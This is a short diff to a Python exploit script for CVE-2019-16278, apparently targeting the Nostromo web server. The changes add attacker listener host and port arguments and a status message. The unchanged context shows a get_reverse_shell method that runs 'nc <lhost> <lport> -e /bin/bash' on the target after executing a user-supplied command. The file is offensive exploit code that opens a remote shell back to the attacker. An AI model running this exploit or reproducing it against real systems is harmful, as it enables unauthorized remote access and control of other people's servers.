@@ -44,6 +44,7 @@ class CVE2019_16278:
 
     # revshell
     def get_reverse_shell(self):
+        print (LogColors.BLUE + "get revershe shell..." + LogColors.ENDC)
         cmd = "nc {} {} -e /bin/bash".format(self.lhost, self.lport)
         self.run(cmd)
 
@@ -56,8 +57,9 @@ if __name__ == '__main__':
     parser.add_argument('-c','--cmd', required = True, help = "command")
     args = vars(parser.parse_args())
     host, port = args['host'], args['port']
+    lhost, lport = args['lhost'], args['lport']
     cmd = args['cmd']
-    cve = CVE2019_16278(host, port)
+    cve = CVE2019_16278(host, port, lhost, lport)
     cve.run(cmd)
     cve.get_reverse_shell()
     #while True:
